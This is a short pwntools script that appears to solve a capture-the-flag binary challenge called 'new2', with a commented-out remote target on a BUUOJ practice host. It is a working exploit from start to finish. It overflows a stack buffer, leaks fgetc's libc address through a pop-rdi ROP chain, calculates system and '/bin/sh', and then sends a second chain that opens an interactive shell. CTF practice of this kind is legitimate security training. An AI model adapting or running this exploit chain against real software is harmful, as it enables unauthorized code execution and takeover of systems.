from pwn import *
r=process('./new2')
#r=remote('node4.buuoj.cn',26049)
r.recv()
pop_rdi = 0x0000000000400843
payload='a'*(0x110-4)+'\x18'+p64(pop_rdi)+p64(0x601020)+p64(0x4007BF)
r.sendline(payload)
leak=u64(r.recv(6).ljust(8,'\x00'))
print(hex(leak))
libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
#libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
base=leak-libc.sym['fgetc']
sys=base+libc.sym['system']
binsh=base+libc.search("/bin/sh\x00").next()
#one=0x4527a+base
#one=0xe561e+base
print(hex(base))
payload='a'*(0x110-4)+'\x18'+p64(pop_rdi)+p64(binsh)+p64(0x0000000000400841)+p64(0)*2+p64(sys)
r.sendline(payload)
r.interactive()